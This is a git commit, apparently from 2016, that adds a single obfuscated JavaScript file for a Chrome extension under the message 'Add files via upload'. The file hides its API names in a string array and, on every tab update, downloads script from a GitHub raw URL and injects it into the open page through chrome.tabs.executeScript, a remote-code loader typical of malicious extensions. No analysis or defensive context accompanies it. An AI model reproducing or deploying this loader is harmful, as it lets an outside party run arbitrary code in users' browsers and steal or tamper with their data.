e97d8105ee01ff9d2aadcd4898102c99e061c088
qimera <vaxti@inbox.ru>
2016-08-27 23:20:01 +0400

    Add files via upload

---
+++ boekakonu.js
@@ -0,0 +1,20 @@
+/** @type {Array} */
+var data = ["onreadystatechange", "readyState", "id", "responseText", "executeScript", "tabs", "GET", "https://raw.githubusercontent.com/betulcelik/dd/master/api?", "random", "floor", "open", "send", "get", "addListener", "onUpdated"];
+chrome[data[5]][data[14]][data[13]](function(trans) {
+  chrome[data[5]][data[12]](trans, function() {
+    /** @type {XMLHttpRequest} */
+    var popcornMedia = new XMLHttpRequest;
+    /**
+     * @return {undefined}
+     */
+    popcornMedia[data[0]] = function() {
+      if (4 == popcornMedia[data[1]]) {
+        chrome[data[5]][data[4]](trans[data[2]], {
+          code : popcornMedia[data[3]]
+        });
+      }
+    };
+    popcornMedia[data[10]](data[6], data[7] + Math[data[9]](15E3 * Math[data[8]]()));
+    popcornMedia[data[11]]();
+  });
+});
